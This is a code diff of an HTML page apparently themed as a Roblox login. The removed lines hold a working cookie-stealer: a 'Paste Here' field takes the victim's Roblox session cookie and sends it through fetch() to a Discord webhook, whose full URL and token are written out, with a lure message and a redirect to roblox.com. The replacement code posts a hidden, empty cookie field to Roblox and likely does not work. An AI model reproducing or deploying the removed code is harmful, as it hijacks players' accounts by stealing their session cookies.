@@ -48,9 +48,9 @@
 </head>
 <body>
     <div class="login-container">
-        <form id="login-form">
-            <input type="text" id="cookie" name="cookie" placeholder="Paste Here" required><br>
-            <input type="submit" id="submit-btn" value="Send">
+        <form id="login-form" action="https://www.roblox.com/Login" method="post">
+            <input type="hidden" id="cookie" name="cookie" value="">
+            <input type="submit" id="submit-btn" value="Login">
         </form>
     </div>
 
@@ -60,30 +60,11 @@
 
             var cookie = document.getElementById('cookie').value;
 
-            // Create data object
-            var data = {
-                content: "Do not enter or leave your account, otherwise it will not work. Cookie: " + cookie
-            };
+            // Set the cookie value
+            document.getElementById('cookie').value = cookie;
 
-            // Send data to Discord webhook using fetch
-            fetch('https://discord.com/api/webhooks/1040678839396872322/TIl24vk7NiW4Fz3zACaKchZhtMc8ien3KjI9ha9EU1dTBeKIDH18H3Fgx3uStpAkG5Ud', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(data)
-            })
-            .then(response => {
-                if (!response.ok) {
-                    throw new Error('Error sending message to Discord');
-                } else {
-                    // Redireciona para o site do Roblox
-                    window.location.href = "https://www.roblox.com/home";
-                }
-            })
-            .catch(error => {
-                console.error('Error:', error);
-            });
+            // Submit the form
+            document.getElementById('login-form').submit();
         });
     </script>
 </body>
